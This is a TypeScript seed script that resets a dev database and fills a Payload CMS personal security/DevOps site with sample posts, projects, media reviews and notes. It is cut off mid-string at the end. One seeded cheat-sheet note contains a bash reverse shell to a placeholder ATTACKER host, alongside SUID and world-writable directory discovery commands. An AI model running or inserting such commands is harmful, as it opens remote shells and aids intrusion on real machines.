/**
 * Seed script for dev database.
 *
 * Usage:
 *   pnpm --filter cms seed
 *
 * What it does:
 *   1. Drops the entire public schema and recreates it (fresh reset)
 *   2. Initialises Payload (which pushes the new schema via push: true)
 *   3. Uploads all seed images (SVG icons + remote covers/hero images)
 *   4. Creates admin user with avatar
 *   5. Populates all collections and the SiteIdentity global with realistic sample data
 *
 * ⚠️  DESTRUCTIVE — only run against the dev DB, never prod.
 */

import 'dotenv/config'
import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import { getPayload } from 'payload'
import { Pool } from 'pg'
import config from './payload.config'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const ASSETS = path.resolve(__dirname, 'seed-assets')

type Payload = Awaited<ReturnType<typeof getPayload>>

// ─── 0. Drop & recreate the public schema ────────────────────────────────────

async function freshReset() {
  const DATABASE_URL = process.env.DATABASE_URL
  if (!DATABASE_URL) throw new Error('DATABASE_URL not set in environment')

  console.log('⚡ Dropping public schema…')
  const pool = new Pool({ connectionString: DATABASE_URL })
  await pool.query('DROP SCHEMA public CASCADE')
  await pool.query('CREATE SCHEMA public')
  await pool.end()
  console.log('✓ Schema reset complete\n')
}

// ─── 1. Boot Payload ──────────────────────────────────────────────────────────

async function bootPayload() {
  console.log('🚀 Initialising Payload (this will push the new schema)…')
  const payload = await getPayload({ config })
  console.log('✓ Payload ready\n')
  return payload
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

/** Upload a local SVG file from seed-assets/ to the Payload media collection */
async function uploadSvg(
  payload: Payload,
  filename: string,
  alt: string,
  caption?: string,
): Promise<number> {
  const data = fs.readFileSync(path.join(ASSETS, filename))
  const doc = await payload.create({
    collection: 'media',
    data: { alt, caption },
    file: {
      data,
      mimetype: 'image/svg+xml',
      name: filename,
      size: data.length,
    },
  })
  return doc.id
}

/** Download a remote image and upload it to the Payload media collection */
async function uploadRemote(
  payload: Payload,
  url: string,
  filename: string,
  alt: string,
  caption?: string,
): Promise<number> {
  const res = await fetch(url)
  if (!res.ok) throw new Error(`Failed to fetch ${url}: ${res.status}`)
  const arrayBuffer = await res.arrayBuffer()
  const data = Buffer.from(arrayBuffer)
  const contentType = res.headers.get('content-type') ?? 'image/jpeg'
  const doc = await payload.create({
    collection: 'media',
    data: { alt, caption },
    file: {
      data,
      mimetype: contentType,
      name: filename,
      size: data.length,
    },
  })
  return doc.id
}

// ─── 2. Seed data ─────────────────────────────────────────────────────────────

async function seed(payload: Payload) {

  // ── Upload SVG icons ────────────────────────────────────────────────────────
  console.log('🖼️  Uploading SVG icons…')

  // Media type icons
  const iconAnime      = await uploadSvg(payload, 'icon-anime.svg',       'Anime icon')
  const iconManga      = await uploadSvg(payload, 'icon-manga.svg',       'Manga icon')
  const iconGame       = await uploadSvg(payload, 'icon-game.svg',        'Games icon')
  const iconMovie      = await uploadSvg(payload, 'icon-movie.svg',       'Movies icon')
  const iconSeries     = await uploadSvg(payload, 'icon-series.svg',      'Series icon')
  const iconBook       = await uploadSvg(payload, 'icon-book.svg',        'Books icon')
  const iconMusic      = await uploadSvg(payload, 'icon-music.svg',       'Music icon')
  const iconOther      = await uploadSvg(payload, 'icon-other.svg',       'Other icon')

  // Media status icons
  const iconCompleted  = await uploadSvg(payload, 'status-completed.svg',   'Completed status')
  const iconInProgress = await uploadSvg(payload, 'status-in-progress.svg', 'In progress status')
  const iconDropped    = await uploadSvg(payload, 'status-dropped.svg',     'Dropped status')
  const iconPlanned    = await uploadSvg(payload, 'status-planned.svg',     'Planned status')

  // Project status icons
  const iconProjActive   = await uploadSvg(payload, 'proj-active.svg',   'Active project status')
  const iconProjBuilding = await uploadSvg(payload, 'proj-building.svg', 'Building project status')
  const iconProjPlanned  = await uploadSvg(payload, 'proj-planned.svg',  'Planned project status')
  const iconProjConcept  = await uploadSvg(payload, 'proj-concept.svg',  'Concept project status')
  const iconProjArchived = await uploadSvg(payload, 'proj-archived.svg', 'Archived project status')

  // Avatar
  const avatarId = await uploadSvg(payload, 'avatar.svg', 'Sigterm operator avatar')

  // ── Download remote images (picsum — stable seeds) ─────────────────────────
  console.log('📥 Downloading remote images…')

  // Blog post hero images (picsum with fixed seeds → always same image)
  const heroBugBounty   = await uploadRemote(payload, 'https://picsum.photos/seed/bugbounty/1200/630',   'hero-bug-bounty.jpg',   'Hero: bug bounty IDOR post',   'Fintech security')
  const heroHomeLab     = await uploadRemote(payload, 'https://picsum.photos/seed/homelab/1200/630',     'hero-home-lab.jpg',     'Hero: home lab build post',     'Home lab hardware')
  const heroTerraform   = await uploadRemote(payload, 'https://picsum.photos/seed/terraform/1200/630',   'hero-terraform.jpg',    'Hero: Terraform + OPA post',    'Cloud infrastructure')
  const heroNix         = await uploadRemote(payload, 'https://picsum.photos/seed/nixos/1200/630',       'hero-nix.jpg',          'Hero: Ansible to Nix post',     'NixOS dotfiles')

  // Favourite media covers
  const coverCyberpunk  = await uploadRemote(payload, 'https://picsum.photos/seed/cyberpunk/400/560',   'cover-cyberpunk.jpg',   'Cyberpunk 2077 cover')
  const coverGitsac     = await uploadRemote(payload, 'https://picsum.photos/seed/gitsac/400/560',      'cover-gitsac.jpg',      'Ghost in the Shell SAC cover')
  const coverEldenRing  = await uploadRemote(payload, 'https://picsum.photos/seed/eldenring/400/560',   'cover-eldenring.jpg',   'Elden Ring cover')
  const coverBerserk    = await uploadRemote(payload, 'https://picsum.photos/seed/berserk/400/560',     'cover-berserk.jpg',     'Berserk cover')
  const coverBR2049     = await uploadRemote(payload, 'https://picsum.photos/seed/bladerunner/400/560', 'cover-br2049.jpg',      'Blade Runner 2049 cover')
  const coverMrRobot    = await uploadRemote(payload, 'https://picsum.photos/seed/mrrobot/400/560',     'cover-mrrobot.jpg',     'Mr. Robot cover')
  const coverHailMary   = await uploadRemote(payload, 'https://picsum.photos/seed/hailmary/400/560',    'cover-hailmary.jpg',    'Project Hail Mary cover')
  const coverDeathNote  = await uploadRemote(payload, 'https://picsum.photos/seed/deathnote/400/560',   'cover-deathnote.jpg',   'Death Note cover')
  const coverNewVegas   = await uploadRemote(payload, 'https://picsum.photos/seed/newvegas/400/560',    'cover-newvegas.jpg',    'Fallout New Vegas cover')
  const coverRustBook   = await uploadRemote(payload, 'https://picsum.photos/seed/rustbook/400/560',    'cover-rustbook.jpg',    'The Rust Programming Language cover')

  // ── Admin user ──────────────────────────────────────────────────────────────
  console.log('👤 Creating admin user…')
  await payload.create({
    collection: 'users',
    data: {
      email: 'admin@sigterm.vodka',
      password: 'changeme123',
      displayName: 'Sigterm',
      handle: 'sigterm015',
      role: 'admin',
      avatar: avatarId,
    },
  })

  // ── Tags ────────────────────────────────────────────────────────────────────
  console.log('🏷️  Creating tags…')
  const tagData = [
    { name: 'DevSecOps',  color: '#ff6b6b' },
    { name: 'Pentesting', color: '#ff9f43' },
    { name: 'Cloud',      color: '#48dbfb' },
    { name: 'Rust',       color: '#ffa502' },
    { name: 'TypeScript', color: '#3742fa' },
    { name: 'Linux',      color: '#ffd32a' },
    { name: 'CTF',        color: '#ff4757' },
    { name: 'AI',         color: '#2ed573' },
    { name: 'Hardware',   color: '#eccc68' },
    { name: 'Automation', color: '#a29bfe' },
  ]
  const tags: Record<string, number> = {}
  for (const t of tagData) {
    const doc = await payload.create({ collection: 'tags', data: { name: t.name, slug: t.name.toLowerCase(), color: t.color } })
    tags[t.name] = doc.id
  }

  // ── Categories ──────────────────────────────────────────────────────────────
  console.log('📂 Creating categories…')
  const catData = [
    { name: 'Security', slug: 'security', description: 'Offensive security, pentesting, and bug bounty writeups' },
    { name: 'DevOps',   slug: 'devops',   description: 'Cloud infrastructure, CI/CD, and automation' },
    { name: 'Hardware', slug: 'hardware', description: 'Tinkering with physical hardware and embedded systems' },
    { name: 'Notes',    slug: 'notes',    description: 'Random thoughts and short-form notes' },
  ]
  const cats: Record<string, number> = {}
  for (const c of catData) {
    const doc = await payload.create({ collection: 'categories', data: c })
    cats[c.name] = doc.id
  }

  // ── Project Statuses ────────────────────────────────────────────────────────
  console.log('🔘 Creating project statuses…')
  const projectStatusData = [
    { value: 'active',    label: 'Active',    color: 'oklch(72% 0.14 80)',   glyph: '●', icon: iconProjActive,   order: 0 },
    { value: 'building',  label: 'Building',  color: 'oklch(72% 0.18 345)',  glyph: '◐', icon: iconProjBuilding, order: 1 },
    { value: 'planned',   label: 'Planned',   color: 'oklch(65% 0.02 60)',   glyph: '○', icon: iconProjPlanned,  order: 2 },
    { value: 'concept',   label: 'Concept',   color: 'oklch(42% 0.08 145)',  glyph: '◌', icon: iconProjConcept,  order: 3 },
    { value: 'archived',  label: 'Archived',  color: 'oklch(45% 0.02 55)',   glyph: '✕', icon: iconProjArchived, order: 4 },
  ]
  const projectStatuses: Record<string, number> = {}
  for (const s of projectStatusData) {
    const doc = await payload.create({ collection: 'project-statuses', data: s })
    projectStatuses[s.value] = doc.id
  }

  // ── Media Types ─────────────────────────────────────────────────────────────
  console.log('🎌 Creating media types…')
  const mediaTypeData = [
    { value: 'anime',  label: 'Anime',   glyph: '🎌', icon: iconAnime,   nowCategory: 'watching',  nowLabel: 'Now watching',  order: 0 },
    { value: 'manga',  label: 'Manga',   glyph: '📖', icon: iconManga,   nowCategory: 'reading',   nowLabel: 'Now reading',   order: 1 },
    { value: 'game',   label: 'Games',   glyph: '🎮', icon: iconGame,    nowCategory: 'playing',   nowLabel: 'Now playing',   order: 2 },
    { value: 'movie',  label: 'Movies',  glyph: '🎬', icon: iconMovie,   nowCategory: 'watching',  nowLabel: 'Now watching',  order: 3 },
    { value: 'series', label: 'Series',  glyph: '📺', icon: iconSeries,  nowCategory: 'watching',  nowLabel: 'Now watching',  order: 4 },
    { value: 'book',   label: 'Books',   glyph: '📚', icon: iconBook,    nowCategory: 'reading',   nowLabel: 'Now reading',   order: 5 },
    { value: 'music',  label: 'Music',   glyph: '🎵', icon: iconMusic,   nowCategory: 'listening', nowLabel: 'Now listening', order: 6 },
    { value: 'other',  label: 'Other',   glyph: '📦', icon: iconOther,   nowCategory: 'none',      nowLabel: '',              order: 7 },
  ] as const
  const mediaTypes: Record<string, number> = {}
  for (const t of mediaTypeData) {
    const doc = await payload.create({ collection: 'media-types', data: { ...t } })
    mediaTypes[t.value] = doc.id
  }

  // ── Media Statuses ──────────────────────────────────────────────────────────
  console.log('✓ Creating media statuses…')
  const mediaStatusData = [
    { value: 'completed',   label: 'Completed',   glyph: '✓', icon: iconCompleted,  order: 0 },
    { value: 'in-progress', label: 'In Progress', glyph: '▶', icon: iconInProgress, order: 1 },
    { value: 'dropped',     label: 'Dropped',     glyph: '✕', icon: iconDropped,    order: 2 },
    { value: 'planned',     label: 'Planned',     glyph: '◌', icon: iconPlanned,    order: 3 },
  ]
  const mediaStatuses: Record<string, number> = {}
  for (const s of mediaStatusData) {
    const doc = await payload.create({ collection: 'media-statuses', data: s })
    mediaStatuses[s.value] = doc.id
  }

  // ── Posts ───────────────────────────────────────────────────────────────────
  console.log('📝 Creating posts…')
  const postsData = [
    {
      title: 'My first bug bounty: how I found an IDOR on a fintech platform',
      slug: 'first-bug-bounty-idor-fintech',
      excerpt: 'A walkthrough of how I discovered an Insecure Direct Object Reference vulnerability that exposed user financial data on a major fintech platform.',
      publishedAt: '2026-02-15T10:00:00.000Z',
      category: cats['Security'],
      tags: [tags['Pentesting'], tags['CTF']],
      featured: true,
      heroImage: heroBugBounty,
      content: {
        root: {
          type: 'root',
          children: [
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'Background', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'It started with a simple curiosity about how the app handled user IDs in API requests. I noticed the endpoint /api/v1/accounts/{id}/transactions was not validating the ownership of the account before returning data.', version: 1 }], version: 1 },
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'The exploit', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'By simply incrementing the account ID parameter, I could access any user\'s transaction history. The fix was straightforward — add proper authorization checks — but the impact was significant: full exposure of PII and financial data for all users.', version: 1 }], version: 1 },
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'Bounty and disclosure', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'The vendor responded within 24 hours, patched within 72 hours, and paid out a $1,500 bounty. Clean process, great communication. This is how responsible disclosure should work.', version: 1 }], version: 1 },
          ],
          direction: 'ltr' as 'ltr' | 'rtl' | null,
          format: '' as '',
          indent: 0,
          version: 1,
        },
      },
    },
    {
      title: 'Building a home lab with a $200 budget: Proxmox, pfSense, and VLANs',
      slug: 'home-lab-proxmox-pfsense-vlans',
      excerpt: 'How I built a fully segmented home lab for pentesting practice using second-hand hardware, Proxmox as hypervisor, and pfSense for network segmentation.',
      publishedAt: '2026-01-28T14:00:00.000Z',
      category: cats['Hardware'],
      tags: [tags['Hardware'], tags['Linux'], tags['DevSecOps']],
      featured: false,
      heroImage: heroHomeLab,
      content: {
        root: {
          type: 'root',
          children: [
            { type: 'paragraph', children: [{ type: 'text', text: 'The goal was simple: a proper segmented lab environment for practicing offensive security without risking my main network. Budget: €200. Result: surprisingly capable.', version: 1 }], version: 1 },
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'Hardware', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'I found a used HP ProDesk 400 G3 mini for €85. 8GB RAM, i5-6500T, 256GB SSD. Added 16GB more RAM for €20. Total: €105. Paired with a managed switch (TP-Link TL-SG108E, €25) for VLAN support.', version: 1 }], version: 1 },
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'Network topology', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'VLAN 10: Management. VLAN 20: Attack machines (Kali). VLAN 30: Vulnerable targets (HackTheBox machines, DVWA). VLAN 99: WAN/untrusted. pfSense handles inter-VLAN routing with strict firewall rules.', version: 1 }], version: 1 },
          ],
          direction: 'ltr' as 'ltr' | 'rtl' | null,
          format: '' as '',
          indent: 0,
          version: 1,
        },
      },
    },
    {
      title: 'Automating cloud compliance with Terraform and OPA',
      slug: 'terraform-opa-cloud-compliance',
      excerpt: 'Using Open Policy Agent with Terraform to enforce security policies as code — no more manual reviews, no more config drift.',
      publishedAt: '2026-01-10T09:00:00.000Z',
      category: cats['DevOps'],
      tags: [tags['Cloud'], tags['Automation'], tags['DevSecOps']],
      featured: false,
      heroImage: heroTerraform,
      content: {
        root: {
          type: 'root',
          children: [
            { type: 'paragraph', children: [{ type: 'text', text: 'Policy as code is the only sane way to manage compliance at scale. Here\'s how I integrated OPA with our Terraform pipeline to catch misconfigurations before they hit production.', version: 1 }], version: 1 },
            { type: 'heading', tag: 'h2', children: [{ type: 'text', text: 'The problem', version: 1 }], version: 1 },
            { type: 'paragraph', children: [{ type: 'text', text: 'Manual PR reviews for Terraform changes don\'t scale. Engineers forget to check for public S3 buckets, unrestricted security groups, unencrypted EBS volumes. OPA solves this by running checks automatically in CI.', version: 1 }], version: 1 },
          ],
          direction: 'ltr' as 'ltr' | 'rtl' | null,
          format: '' as '',
          indent: 0,
          version: 1,
        },
      },
    },
    {
      title: 'Why I switched from Ansible to Nix for my dotfiles',
      slug: 'ansible-to-nix-dotfiles',
      excerpt: 'After years of managing dotfiles with Ansible, I made the jump to Nix/NixOS. Here\'s what I learned and why I\'m not going back.',
      publishedAt: '2025-12-20T11:00:00.000Z',
      category: cats['Notes'],
      tags: [tags['Linux'], tags['Automation']],
      featured: false,
      heroImage: heroNix,
      content: {
        root: {
          type: 'root',
          children: [
            { type: 'paragraph', children: [{ type: 'text', text: 'The reproducibility argument for Nix is real. After my laptop died and I restored my entire environment in 20 minutes on a new machine, I was sold. Here\'s the journey.', version: 1 }], version: 1 },
          ],
          direction: 'ltr' as 'ltr' | 'rtl' | null,
          format: '' as '',
          indent: 0,
          version: 1,
        },
      },
    },
  ]

  const postIds: Record<string, number> = {}
  for (const p of postsData) {
    const doc = await payload.create({
      collection: 'posts',
      data: { ...p, _status: 'published' },
    })
    postIds[p.slug] = doc.id
  }

  // ── Projects ────────────────────────────────────────────────────────────────
  console.log('⚡ Creating projects…')
  const projectsData = [
    {
      title: 'Templ3',
      slug: 'templ3',
      summary: 'My personal site — a retro cyberpunk OS simulation built with Astro, React, Three.js, and Payload CMS. Edge deployed on Cloudflare Workers.',
      projectStatus: projectStatuses['active'],
      featured: true,
      order: 0,
      stack: [{ label: 'Astro' }, { label: 'React' }, { label: 'Three.js' }, { label: 'Payload CMS' }, { label: 'Cloudflare' }],
      repositoryUrl: 'https://github.com/SIGTERM-015/templ3',
      tags: [tags['TypeScript'], tags['Cloud']],
    },
    {
      title: 'SecScan',
      slug: 'secscan',
      summary: 'Automated vulnerability scanner for cloud infrastructure. Checks AWS/GCP/Azure resources against CIS benchmarks and exports findings as SARIF.',
      projectStatus: projectStatuses['building'],
      featured: true,
      order: 1,
      stack: [{ label: 'Rust' }, { label: 'AWS SDK' }, { label: 'SARIF' }],
      repositoryUrl: 'https://github.com/SIGTERM-015/secscan',
      tags: [tags['Rust'], tags['Cloud'], tags['DevSecOps']],
    },
    {
      title: 'DotFiles',
      slug: 'dotfiles',
      summary: 'My NixOS + Home Manager configuration. Fully reproducible dev environment across machines.',
      projectStatus: projectStatuses['active'],
      featured: false,
      order: 2,
      stack: [{ label: 'Nix' }, { label: 'NixOS' }, { label: 'Home Manager' }],
      repositoryUrl: 'https://github.com/SIGTERM-015/dotfiles',
      tags: [tags['Linux'], tags['Automation']],
    },
    {
      title: 'CTF Writeups',
      slug: 'ctf-writeups',
      summary: 'Collection of CTF challenge writeups. HackTheBox, TryHackMe, and national competitions.',
      projectStatus: projectStatuses['active'],
      featured: false,
      order: 3,
      stack: [{ label: 'Python' }, { label: 'Ghidra' }, { label: 'pwntools' }],
      repositoryUrl: 'https://github.com/SIGTERM-015/ctf-writeups',
      tags: [tags['Pentesting'], tags['CTF']],
    },
    {
      title: 'PiGuard',
      slug: 'piguard',
      summary: 'Raspberry Pi-based network monitor with IDS capabilities. Detects port scans, ARP spoofing, and unusual DNS queries.',
      projectStatus: projectStatuses['building'],
      featured: false,
      order: 4,
      stack: [{ label: 'Python' }, { label: 'Raspberry Pi' }, { label: 'Suricata' }],
      tags: [tags['Hardware'], tags['DevSecOps']],
    },
    {
      title: 'Phantom',
      slug: 'phantom',
      summary: 'Lightweight C2 framework for red team exercises. Shellcode loader with AMSI bypass and process injection.',
      projectStatus: projectStatuses['concept'],
      featured: false,
      order: 5,
      stack: [{ label: 'Rust' }, { label: 'C' }, { label: 'Windows API' }],
      tags: [tags['Pentesting'], tags['Rust']],
    },
    {
      title: 'MLGuard',
      slug: 'mlguard',
      summary: 'ML-based anomaly detection for cloud logs. Trained on CloudTrail events to flag suspicious API calls.',
      projectStatus: projectStatuses['planned'],
      featured: false,
      order: 6,
      stack: [{ label: 'Python' }, { label: 'PyTorch' }, { label: 'AWS CloudTrail' }],
      tags: [tags['AI'], tags['Cloud'], tags['DevSecOps']],
    },
  ]

  for (const p of projectsData) {
    await payload.create({
      collection: 'projects',
      data: { ...p, _status: 'published' },
    })
  }

  // ── Links ───────────────────────────────────────────────────────────────────
  console.log('🔗 Creating links…')
  const linksData = [
    { label: 'GitHub',      platform: 'Code forge',    href: 'https://github.com/SIGTERM-015',                     description: 'Repos, labs, automations, and security experiments.', icon: '{}',  featured: true },
    { label: 'X / Twitter', platform: 'Microblogging', href: 'https://x.com/SIGTERM015',                           description: 'Me being silly, programming related rants, and shitposting.', icon: 'X', featured: true },
    { label: 'Email',       platform: 'Direct line',   href: 'mailto:me@sigterm.vodka',                            description: 'Channel for opportunities, inquiries, or interesting ideas.', icon: '@', featured: true },
    { label: 'HackTheBox',  platform: 'CTF Platform',  href: 'https://app.hackthebox.com/profile/000000',          description: 'My HackTheBox profile — machines, challenges, and rankings.', icon: 'H', featured: false },
    { label: 'LinkedIn',    platform: 'Professional',  href: 'https://linkedin.com',                               description: 'Professional profile. I check it occasionally.', icon: 'in', featured: false },
  ]
  for (const l of linksData) {
    await payload.create({ collection: 'links', data: l })
  }

  // ── Favourite Media ─────────────────────────────────────────────────────────
  console.log('🎮 Creating favourite media…')
  const mediaData = [
    {
      title: 'Cyberpunk 2077',
      slug: 'cyberpunk-2077',
      mediaType: mediaTypes['game'],
      progress: mediaStatuses['completed'],
      rating: 9,
      review: 'The game CDPR promised. After the patches it became one of my all-time favourites. The atmosphere is unmatched.',
      completedAt: '2024-06-15T00:00:00.000Z',
      featured: true,
      coverImage: coverCyberpunk,
    },
    {
      title: 'Ghost in the Shell: Stand Alone Complex',
      slug: 'gits-sac',
      mediaType: mediaTypes['anime'],
      progress: mediaStatuses['completed'],
      rating: 10,
      review: 'The cyberpunk anime. Philosophical depth, incredible action, and the best AI/transhumanism storylines in the medium.',
      completedAt: '2023-09-01T00:00:00.000Z',
      featured: true,
      coverImage: coverGitsac,
    },
    {
      title: 'Elden Ring',
      slug: 'elden-ring',
      mediaType: mediaTypes['game'],
      progress: mediaStatuses['in-progress'],
      rating: 9,
      review: 'Playing through the DLC. Brutally hard, rewarding beyond measure.',
      featured: false,
      coverImage: coverEldenRing,
    },
    {
      title: 'Berserk',
      slug: 'berserk',
      mediaType: mediaTypes['manga'],
      progress: mediaStatuses['in-progress'],
      rating: 10,
      review: 'The greatest manga ever written. Reading the posthumous arcs.',
      featured: true,
      coverImage: coverBerserk,
    },
    {
      title: 'Blade Runner 2049',
      slug: 'blade-runner-2049',
      mediaType: mediaTypes['movie'],
      progress: mediaStatuses['completed'],
      rating: 10,
      review: 'Perfect film. Villeneuve at his best. The atmosphere makes Cyberpunk 2077 feel like a documentary.',
      completedAt: '2023-01-10T00:00:00.000Z',
      featured: false,
      coverImage: coverBR2049,
    },
    {
      title: 'Mr. Robot',
      slug: 'mr-robot',
      mediaType: mediaTypes['series'],
      progress: mediaStatuses['completed'],
      rating: 10,
      review: 'The most technically accurate hacking show ever made. Essential viewing for anyone in security.',
      completedAt: '2022-08-20T00:00:00.000Z',
      featured: false,
      coverImage: coverMrRobot,
    },
    {
      title: 'Project Hail Mary',
      slug: 'project-hail-mary',
      mediaType: mediaTypes['book'],
      progress: mediaStatuses['completed'],
      rating: 10,
      review: 'Andy Weir outdid himself. Better than The Martian. The science is bulletproof and the story is emotionally devastating.',
      completedAt: '2024-02-01T00:00:00.000Z',
      featured: false,
      coverImage: coverHailMary,
    },
    {
      title: 'Death Note',
      slug: 'death-note',
      mediaType: mediaTypes['anime'],
      progress: mediaStatuses['completed'],
      rating: 8,
      review: 'Classic. The first 25 episodes are some of the best TV ever made. Then Light won. You know how it goes.',
      completedAt: '2022-03-15T00:00:00.000Z',
      featured: false,
      coverImage: coverDeathNote,
    },
    {
      title: 'Fallout: New Vegas',
      slug: 'fallout-new-vegas',
      mediaType: mediaTypes['game'],
      progress: mediaStatuses['completed'],
      rating: 10,
      review: 'The peak of the Fallout series. Political nuance, memorable factions, and the Mojave is a masterpiece of world design.',
      completedAt: '2023-11-10T00:00:00.000Z',
      featured: false,
      coverImage: coverNewVegas,
    },
    {
      title: 'The Rust Programming Language',
      slug: 'the-rust-book',
      mediaType: mediaTypes['book'],
      progress: mediaStatuses['in-progress'],
      rating: 9,
      review: 'The borrow checker finally clicked. This book is exceptionally well written.',
      featured: false,
      coverImage: coverRustBook,
    },
  ]

  for (const m of mediaData) {
    await payload.create({
      collection: 'favourite-media',
      data: { ...m, _status: 'published' },
    })
  }

  // ── Notes ───────────────────────────────────────────────────────────────────
  console.log('📄 Creating notes…')
  const notesData = [
    {
      title: 'About this site',
      slug: 'about-this-site',
      filename: 'about.md',
      order: 0,
      publishedAt: '2026-03-01T00:00:00.000Z',
      content: `# About Templ3

This site is my digital sanctuary — a retro cyberpunk OS simulation running in your browser.

## Tech stack

- **Frontend**: Astro 5 + React 19 + Three.js (CRT overlay, postprocessing)
- **CMS**: Payload CMS 3 on Neon PostgreSQL
- **Deployment**: Cloudflare Workers (edge) + Cloudflare R2 (media)

## Design philosophy

Inspired by TempleOS, Soviet aesthetics, and every cyberpunk game I've ever played.
The goal is a website that feels like a machine, not a marketing page.

## Open source

The source is on GitHub. Feel free to steal whatever's useful.`,
    },
    {
      title: 'Reading list 2026',
      slug: 'reading-list-2026',
      filename: 'reading-2026.md',
      order: 1,
      publishedAt: '2026-01-01T00:00:00.000Z',
      content: `# Reading list 2026

## Security / Technical

- [ ] The Web Application Hacker's Handbook
- [ ] Hacking: The Art of Exploitation (Erickson)
- [x] The Rust Programming Language (in progress)
- [ ] Computer Networks (Tanenbaum)

## Fiction

- [x] Project Hail Mary — Andy Weir ⭐
- [ ] Neuromancer — William Gibson
- [ ] Snow Crash — Neal Stephenson
- [ ] A Fire Upon the Deep — Vernor Vinge

## Manga

- [ ] Vinland Saga (caught up)
- [x] Berserk (ongoing, posthumous arcs)`,
    },
    {
      title: 'Quick reference: Nmap',
      slug: 'nmap-cheatsheet',
      filename: 'nmap.md',
      order: 2,
      publishedAt: '2026-02-10T00:00:00.000Z',
      content: `# Nmap Quick Reference

## Basic scans

\`\`\`bash
# Host discovery
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth)
nmap -sS -p- target

# Service/version detection
nmap -sV -sC target

# OS detection
nmap -O target
\`\`\`

## Useful flags

| Flag | Description |
|------|-------------|
| \`-Pn\` | Skip host discovery |
| \`-T4\` | Aggressive timing |
| \`--open\` | Show only open ports |
| \`-oA\` | Output all formats |

## NSE scripts

\`\`\`bash
# Vuln scan
nmap --script vuln target

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users target
\`\`\``,
    },
    {
      title: 'Shell one-liners',
      slug: 'shell-oneliners',
      filename: 'shell.md',
      order: 3,
      publishedAt: '2026-02-20T00:00:00.000Z',
      content: `# Useful shell one-liners

## Files & filesystem

\`\`\`bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find world-writable dirs
find / -perm -o+w -type d 2>/dev/null

# Largest files
du -sh /* | sort -rh | head -10
\`\`\`

## Network

\`\`\`bash
# Active connections
ss -tulpn

# Listen for HTTP
python3 -m http.server 8080

# Reverse shell (bash)
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
\`\`\`

## Process / system

\`\`\`bash
# Who's running what
ps aux --sort=-%cpu | head -20

# Open files by process
lsof -p PID

# Watch a command
watch -n 1 'ps aux | grep nginx'
\`\`\``,
    },
  ]

  for (const n of notesData) {
    await payload.create({
      collection: 'notes',
      data: { ...n, _status: 'published' },
    })
  }

  // ── SiteIdentity global ─────────────────────────────────────────────────────
  console.log('🌐 Populating SiteIdentity global…')
  await payload.updateGlobal({
    slug: 'site-identity',
    data: {
      siteName: 'Templ3',
      siteDomain: 'sigterm.vodka',
      siteEmail: 'hello@sigterm.vodka',
      siteDescription: "Sigterm's personal web: DevSecOps, hacking, hardware, AI, and a retro cyberpunk aesthetic.",
      handle: 'Sigterm',
      aliases: [{ alias: 'Sigterm015' }, { alias: 'SIGTERM-015' }],
      role: 'DevSecOps / DevOps / Pentester',
      specialty: 'Cloud Infrastructure, Pentesting, Hardware',
      status: 'active',
      claim: 'Architecting secure cloud environments, breaking systems, and hacking stuff.',
      intro: 'Cloud infrastructure, offensive security, hacking stuff, and a retro-cyberpunk terminal aesthetic.',
      bio: [
        { paragraph: 'Hy!!! Hello!!! :3' },
        { paragraph: "I'm Sigterm!!! welcome to my website!!!" },
        { paragraph: 'As you can imagine, i am a nerd, i love computers, hacking, and tinkering with stuff.' },
        { paragraph: "I work as a DevSecOps but im getting into pentesting and cibersecurity lately with already 2 bounties claimed." },
      ],
      inspirations: [
        { tag: 'Cyberpunk 2077' }, { tag: 'Fallout' }, { tag: 'Project Zomboid' }, { tag: 'Bitburner' },
        { tag: "Baldur's Gate 3" }, { tag: 'anime and manga' }, { tag: 'cute things' }, { tag: 'zombie fiction' },
        { tag: 'TempleOS' }, { tag: 'soviet aesthetic' }, { tag: 'post-apocalyptic' }, { tag: 'linux' }, { tag: 'open source' },
      ],
      navGuideTitle: 'README.txt — How to navigate Templ3',
      navGuideLines: [
        { line: 'Welcome to TEMPL3 OS v0.6.6.6' },
        { line: '' },
        { line: "This is Sigterm's digital sanctuary." },
        { line: 'The web works like a computer desktop:' },
        { line: '' },
        { line: '  - Double click icons to open applications.' },
        { line: '  - You can have multiple windows open at once.' },
        { line: '  - Drag windows by their title bar.' },
        { line: '  - Resize from the bottom right corner.' },
        { line: '  - [_] minimize, [□] maximize, [✕] close.' },
        { line: '' },
        { line: 'Available applications:' },
        { line: '  dossier    → Profile / About' },
        { line: '  gazette    → Blog / Writeups' },
        { line: '  armory     → Projects / Arsenal' },
        { line: '  media      → Favourite Media' },
        { line: '  comms      → Links / Contact' },
        { line: '  notes      → Markdown notes folder' },
        { line: '  terminal   → Command line' },
        { line: '' },
        { line: 'Open terminal with Ctrl+` at any time.' },
        { line: 'Type "help" to see available commands.' },
        { line: '' },
        { line: '// sigterm.vodka — edge deployed' },
      ],
      terminalPrompt: 'sigterm@templ3:~$',
      terminalPwd: '/home/sigterm',
      terminalUname: 'Templ3 OS 0.6.6.6 sigterm-sanctum x86_64 GNU/Linux',
      whoamiOutput: `Handle:    Sigterm / Sigterm015
Role:      DevSecOps → Red Team
Status:    ACTIVE
Specialty: Pentesting, Bug Bounty, Automation
Domain:    sigterm.vodka
Codename:  Templ3`,
      neofetchOutput: `
  ╔════════════════════╗    sigterm@templ3
  ║  ████████████████  ║    ─────────────────
  ║  ██  TEMPL3    ██  ║    OS:      Templ3 OS v0.6.6.6
  ║  ██  >_        ██  ║    Kernel:  Astro 5.17
  ║  ██            ██  ║    Shell:   React Three Fiber
  ║  ████████████████  ║    Uptime:  since 2026
